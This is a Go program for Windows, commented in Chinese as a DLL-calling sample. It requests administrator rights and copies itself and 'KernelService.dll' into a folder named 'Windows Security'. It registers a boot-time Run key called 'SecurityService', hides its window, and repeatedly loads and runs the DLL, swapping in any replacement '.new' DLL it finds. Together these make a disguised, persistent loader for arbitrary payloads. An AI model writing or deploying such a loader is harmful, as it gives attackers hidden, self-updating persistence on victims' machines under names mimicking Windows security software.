package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

/*
	此程序为Go调用动态链接库'KernelService.dll'的示例程序.
	为了使所编译程序能在32位及Windows7系统运行需使用下述编译命令.
	程序会将文件拷贝到C盘某个目录(destFolder)下并设置开机启动项.

set GOARCH=386
set GOOS=windows
go build -ldflags="-H windowsgui -s -w" -o go_program.exe main.go
为了保证在Windows7能够运行, 需使用Go 1.16及其以下版本.
*/
func main() {
	var (
		fileName, libFunc, destFolder, svrName string
		failed                                 = 0
		visible                                = false
	)
	flag.BoolVar(&visible, "visible", false, "Set the window visible (default false)")           // 窗口是否可见
	flag.StringVar(&fileName, "name", "KernelService", "Give the dll name")                      // DLL名称
	flag.StringVar(&libFunc, "function", "EasyRun", "Give the dll function name")                // DLL中的函数
	flag.StringVar(&destFolder, "path", `C:\Program Files\Windows Security`, "Installation dir") // 程序拷贝路径
	flag.StringVar(&svrName, "service", "SecurityService", "Give the regist service name")       // 自启动项名称
	flag.Parse()

	//////////////////////////////////////////////////////////////////////////////////////
	var library = fileName + ".dll"
	// 获取当前程序的路径
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println(">> Error getting executable path: ", err)
		return
	}
	// DLL必须存在
	var curDir = filepath.Dir(exePath)
	var path = filepath.Join(curDir, library)
	if !fileExists(path) {
		fmt.Printf(">> The library '%s' doesn't exist!\n", library)
		time.Sleep(3 * time.Second)
		return
	}

	// 构建目标文件路径
	destFile := filepath.Join(destFolder, filepath.Base(exePath))

	// 如果目标路径和当前程序路径不同，向目标路径拷贝
	if exePath != destFile {
		// 检查当前程序是否是以管理员身份运行
		if !isAdmin() {
			// 如果没有管理员权限，尝试以管理员权限重新运行程序
			if err := runAsAdmin(exePath); err == nil {
				return // 以管理员权限运行
			}
			fmt.Println(">> Please run as 【administrator】!")
		}
		defer time.Sleep(3 * time.Second)

		// 创建文件夹
		err = os.MkdirAll(destFolder, os.ModePerm)
		if err != nil {
			fmt.Println(">> Error creating directory: ", err)
			return
		}
		// 拷贝当前DLL和程序到目标文件夹
		if copyFile(filepath.Join(filepath.Dir(exePath), library),
			filepath.Join(destFolder, library)) != nil {
			failed++
			fmt.Println(">> Error preparing service file!!!")
		}
		if copyFile(exePath, destFile) != nil {
			failed++
			fmt.Println(">> Error preparing service file!!!")
		}
		// 设置开机启动项
		err = setRegistryStartup(destFile, svrName)
		if err != nil {
			failed++
			fmt.Println(">> Error setting registry value: ", err)
		}
		if failed != 0 {
			fmt.Printf(">> The service runs failed!!! %d.\n", failed)
			time.Sleep(5 * time.Second)
		} else {
			fmt.Printf(">> The service runs successfully!\n")
			time.Sleep(2 * time.Second)
		}
	}

	// 当前窗口句柄
	procGetConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")

	if handle, _, _ := procGetConsoleWindow.Call(); handle != 0 {
		procShowWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
		if visible {
			_, _, _ = procShowWindow.Call(handle, 5)
		} else {
			_, _, _ = procShowWindow.Call(handle, 0) // 隐藏窗口
		}
	}

	//////////////////////////////////////////////////////////////////////////////////////

	defer func() {
		// 如果DLL位数和当前Go程序不匹配将进入此处
		if r := recover(); r != nil {
			fmt.Println("Recovered in main: ", r)
			time.Sleep(5 * time.Second)
		}
	}()
	var oldFile = filepath.Join(curDir, fileName+".old")
	var newFile = filepath.Join(curDir, fileName+".new")
	for {
		if fileExists(newFile) { // 如果有新dll，则加载新的dll
			if fileExists(oldFile) {
				err := os.Remove(oldFile)
				fmt.Printf(">> Remove file '%s': %v.\n", oldFile, err)
			}
			if !fileExists(oldFile) && fileExists(path) {
				err := os.Rename(path, oldFile)
				fmt.Printf(">> Move file '%s' -> '%s': %v.\n", path, oldFile, err)
			}
			if !fileExists(path) {
				err := os.Rename(newFile, path)
				fmt.Printf(">> Move file '%s' -> '%s': %v.\n", newFile, path, err)
			}
		}

		myDLL := syscall.NewLazyDLL(path)
		if myDLL == nil {
			fmt.Printf(">> Load library '%s' failed!\n", library)
			return
		}
		fmt.Printf(">> Load library '%s' succeed!\n", library)
		myFunction := myDLL.NewProc(libFunc)
		if myFunction == nil {
			fmt.Printf(">> Find function in library '%s' failed!\n", library)
			return
		}
		fmt.Printf(">> Find function in library '%s' succeed!\n", library)
		for {
			ret, _, err := myFunction.Call()
			fmt.Printf(">> Service finish running! %v. %v\n", ret, err)
			if int(ret) == 1 {
				fmt.Printf(">> Service exit successfully!\n")
				return
			}
			break
		}
		_ = syscall.FreeLibrary(syscall.Handle(myDLL.Handle()))
		fmt.Printf(">> Free library '%s'!\n", library)
		time.Sleep(2 * time.Second)
	}
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return !os.IsNotExist(err)
}

// isAdmin 检查当前程序是否是以管理员身份运行
func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// runAsAdmin 以管理员权限重新启动程序
func runAsAdmin(exePath string) error {
	// 转换路径为 UTF-16
	exePathUTF16 := syscall.StringToUTF16Ptr(exePath)

	// 调用 ShellExecute 函数请求管理员权限
	var procShellExecute = syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW")
	ret, _, err := procShellExecute.Call(0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
		uintptr(unsafe.Pointer(exePathUTF16)), 0, 0, 1)

	if ret <= 32 {
		return err
	}
	return nil
}

// copyFile 拷贝文件的函数
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}

// setRegistryStartup 设置开机启动项
func setRegistryStartup(programPath, name string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	// 设置启动项的名字和路径
	err = key.SetStringValue(name, programPath)
	return err
}
